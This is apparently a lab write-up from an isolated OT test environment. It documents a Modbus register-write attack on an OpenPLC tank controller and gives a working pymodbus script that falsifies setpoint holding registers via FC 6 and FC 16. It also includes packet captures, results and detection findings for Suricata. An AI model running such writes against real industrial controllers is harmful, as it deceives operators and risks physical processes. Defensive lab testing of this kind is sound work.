# Phase 2 Scenario 4 — Holding-register write (SP_Low / SP_High) — §5.3 extension

**Date:** 2026-05-22
**Source task:** Phase 2 attack scenarios (step 2 of Phase 2)
**Attacker vantage:** `otlab-attacker` multi-homed on `ot_zone`
(`172.18.0.4`), target `openplc:502` (`172.18.0.2`).
**Modbus map:** HR 1 = `%QW1` = `SP_Low_Out` (display-only mirror of
internal `SP_Low`); HR 2 = `%QW2` = `SP_High_Out` (display-only mirror
of internal `SP_High`).

---

## Setup

Same boundary-crossed state as scenarios 1–3. No HMI screenshot for
this scenario — the FUXA HMI view does not bind SP_Low or SP_High to
any visual widget (confirmed by inspecting FUXA's project SQLite at
`fuxa/appdata/project.fuxap.db`: SP_Low / SP_High tag IDs have zero
references in the view's SVG content). The setpoint values are
polled by FUXA but not displayed, so a screenshot would not show the
falsification. Adding setpoint displays to the HMI is tracked as a
Phase 1 Open Item ("HMI layout polish"); not in scope here.

Capture vantage: `tcpdump -i any` inside `otlab-openplc`. Filter
`'tcp port 502'`.

---

## Prediction (stated before running)

This scenario directly tests what `docs/network-security.md` §5.3
explicitly deferred: writes to the *other* PLC-output holding
registers (HR 1, HR 2), where §5.3 had only tested HR 0.

Mechanism prediction (from reading `plc/tank_fill.st`):

- The .st program writes `SP_Low_Out := SP_Low;` and `SP_High_Out
  := SP_High;` on every ~100 ms scan (lines 102–103). Modbus
  writes to HR 1 / HR 2 will be reasserted on the next scan.
- The internal `SP_Low` and `SP_High` constants (lines 57–58) are
  what the control logic actually uses; they are not exposed via
  Modbus. So the attack will NOT redirect pump or valve behavior
  — the control loop will keep using the internal 20 / 80
  setpoints, and the tank will continue its normal hysteresis
  cycle throughout.
- Read-back at +0 ms should catch the falsified values; +500 ms
  and later should show the PLC's reasserted defaults.

Independent prediction for the bonus FC 16 (multi-register write):
same outcome as FC 6 — Modbus accepts the multi-write, both
registers get falsified in one PDU, both reassert on the next scan.

---

## Commands

```bash
docker exec -d otlab-openplc sh -c \
  "tcpdump -i any -U -w /tmp/scenario-4.pcap 'tcp port 502'"
sleep 2

docker exec -i otlab-attacker python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
import time
c = ModbusTcpClient(host='openplc', port=502)
c.connect()

def snap(label, delay=0):
    if delay: time.sleep(delay)
    r = c.read_holding_registers(0, 3, slave=1).registers
    print(f"{label:18s}  HR0(level)={r[0]:3d}  HR1(SP_Low)={r[1]:3d}  HR2(SP_High)={r[2]:3d}")

snap("BEFORE")
end = time.time() + 3.0
n = 0
while time.time() < end:
    c.write_register(1, 70, slave=1)   # FC 6 — HR1 := 70 (was 20)
    c.write_register(2, 10, slave=1)   # FC 6 — HR2 := 10 (was 80)
    n += 2
    time.sleep(0.05)
print(f"BURST              sent {n} write_register calls")

snap("AFTER +0ms")
snap("AFTER +500ms",  0.5)
snap("AFTER +1000ms", 0.5)
snap("AFTER +2000ms", 1.0)
snap("AFTER +3000ms", 1.0)

# Bonus: FC 16 multi-register write in one PDU
print()
r = c.write_registers(1, [99, 11], slave=1)
print(f"BONUS FC16 ack:    address={r.address} count={r.count}")
snap("AFTER FC16 +0ms")
snap("AFTER FC16 +500ms", 0.5)
c.close()
PY

sleep 3
docker exec otlab-openplc pkill tcpdump
docker cp otlab-openplc:/tmp/scenario-4.pcap \
  ./captures/phase2-scenario-4-hr-writes-2026-05-22.pcap
```

---

## Observed output

```
BEFORE              HR0(level)= 76  HR1(SP_Low)= 20  HR2(SP_High)= 80
BURST               sent 120 write_register calls    (60×HR1=70 + 60×HR2=10)
AFTER +0ms          HR0(level)= 46  HR1(SP_Low)= 70  HR2(SP_High)= 10
AFTER +500ms        HR0(level)= 41  HR1(SP_Low)= 20  HR2(SP_High)= 80
AFTER +1000ms       HR0(level)= 36  HR1(SP_Low)= 20  HR2(SP_High)= 80
AFTER +2000ms       HR0(level)= 26  HR1(SP_Low)= 20  HR2(SP_High)= 80
AFTER +3000ms       HR0(level)= 24  HR1(SP_Low)= 20  HR2(SP_High)= 80

BONUS FC16 ack:     address=1 count=2
AFTER FC16 +0ms     HR0(level)= 24  HR1(SP_Low)= 99  HR2(SP_High)= 11
AFTER FC16 +500ms   HR0(level)= 29  HR1(SP_Low)= 20  HR2(SP_High)= 80
```

Three observations from the table:

1. **+0 ms read caught both setpoints falsified simultaneously.** HR1
   = 70 AND HR2 = 10 at the same instant. That means no PLC scan
   ran between the burst's last writes and our +0 ms read. The PLC
   reasserts BOTH registers in a single scan iteration (lines
   102–103 of the .st are adjacent), so the moment a scan runs the
   pair flips back together.

2. **+500 ms read shows the reassertion complete on BOTH.** HR1=20,
   HR2=80 — same values as BEFORE. The scan ran sometime in the
   ~500 ms window after burst end.

3. **HR 0 (level) cycled normally throughout the attack.**
   76 → 46 → 41 → 36 → 26 → 24 → 29. That's a steady drain at the
   expected rate (~10 %/sec while Fill_Active is FALSE — process
   model line 88 subtracts DRAIN_RATE = 1 per scan = 10/sec). Then
   level=24 stays near the bottom and starts climbing again
   (24 → 29 in the last second) — the tank just crossed the SP_Low
   hysteresis at 20 and re-entered fill phase. **The PLC's
   control logic ran undisturbed throughout the attack** — the
   internal `SP_Low` / `SP_High` constants are what the hysteresis
   uses; they live in the PLC's runtime memory, not in the
   Modbus-exposed image, and our writes never touched them.

#### Packet capture summary

- `captures/phase2-scenario-4-hr-writes-2026-05-22.pcap`
- 44 KB, 464 packets total
- 129 attacker→openplc PUSH packets — that's 60 FC 6 writes to HR 1
  + 60 FC 6 writes to HR 2 + 1 FC 16 multi-write + 8 read-back reads
  = 129. Matches.
- Single TCP connection used for the FC 6 burst + FC 16 + reads.
- Interleaved with the legitimate FUXA→openplc polling on the
  mgmt_zone interface (visible because the openplc-vantage capture
  is `-i any`).

---

## Findings (plain English)

1. **§5.3 extends cleanly to HR 1 and HR 2 — no surprises at the
   protocol layer.** FC 6 (write single register) and FC 16 (write
   multiple registers) both accepted with no exception; falsified
   values present at the +0 ms read; PLC reasserts within ~500 ms
   on the next scan. Architecturally identical to the HR 0 finding
   in `docs/network-security.md` §5.3 — the §5.3 scope-honesty note
   ("only output registers tested; HR 1/HR 2 not yet exercised")
   can now be retired.

2. **The control loop is genuinely unaffected.** Across 3 seconds
   of sustained falsification + 5 seconds of post-burst observation,
   the tank's hysteresis behavior was indistinguishable from a
   baseline cycle: level fell from 76 to 24, hit SP_Low (=20
   internal), began the next fill cycle. This empirically confirms
   the .st-code analysis from the task's Step 1 read-first: HR 1 /
   HR 2 are pure output mirrors (`SP_Low_Out := SP_Low;`,
   `SP_High_Out := SP_High;`), not control inputs. **The original
   user-prompt hypothesis "writes to HR 1 / HR 2 could redirect
   pump behavior" is empirically refuted** — the PLC's control
   state lives in non-Modbus-mapped variables that no external
   write can touch.

3. **The attack is therefore HMI-side only, by construction.** An
   attacker writing the SP_* mirrors can fool any monitoring view
   that displays them. They cannot change what the PLC actually
   does. This is the same operational-deception class scenario 3
   demonstrated for the alarm coil — different mechanism (numeric
   value vs binary indicator), same security story.

4. **FC 16 (multi-register write) is also accepted and behaves
   identically.** Scenario 2 showed FC 16 was protocol-accepted to
   unmapped addresses; scenario 4's bonus probe confirms it
   produces the same reassertion behavior to mapped addresses as
   FC 6. So the §5.3 scope-honesty note about "FC 15/16 not yet
   exercised" is also retired for the register path. (FC 15 to
   coils is still untested empirically — the multi-coil case
   should logically behave identically to scenario 3's FC 5 case,
   but the empirical test for FC 15 would be a small follow-up.)

5. **For Suricata in step 3:** same conclusion as scenario 3 —
   the detection signal is source-IP + FC, not state. A defender
   watching HR 1 / HR 2 for "unexpected values" will see only the
   PLC's reasserted defaults at the cadence Suricata can sample
   (it cannot sample at PLC scan rate). The signal that *does*
   distinguish attack from baseline is "FC 6 or FC 16 packet from a
   source other than FUXA, targeting HR 0–2."

---

## Cross-references

- `docs/network-security.md` §5.3 — scope-honesty note about
  untested coil + HR 1 / HR 2 writes is now closed (scenario 3
  covered FC 5 to coil 2; scenario 4 covers FC 6 + FC 16 to
  HR 1 / HR 2).
- `plc/tank_fill.st` lines 57–58 (internal `SP_Low` / `SP_High`
  constants) — empirically confirmed unreachable from Modbus.
- `docs/monitoring.md` §5 row 1 (any write FC) — triggered.
- `docs/monitoring.md` §5 row 2 (new source IP to :502) — triggered.
- `captures/phase2-scenario-4-hr-writes-2026-05-22.pcap`
  (gitignored, 44 KB, 464 packets).
- Phase 1 Open Items / HMI layout polish — out of scope here;
  adding numeric setpoint displays to the HMI would let scenario 4
  produce a screenshot like scenario 3's, but the §5.3-extension
  finding is conclusive without it.

---

## Hand-off to scenario 5

Scenarios 1–4 all involve the attacker generating fresh Modbus PDUs
from its own pymodbus stack. Scenario 5 is qualitatively different:
the attacker captures a legitimate FUXA → openplc PDU and **replays
it verbatim** from a different source IP. That test isolates the
protocol-level "no authentication, no replay protection" lesson from
the "no access control" lesson scenarios 2–4 just established.
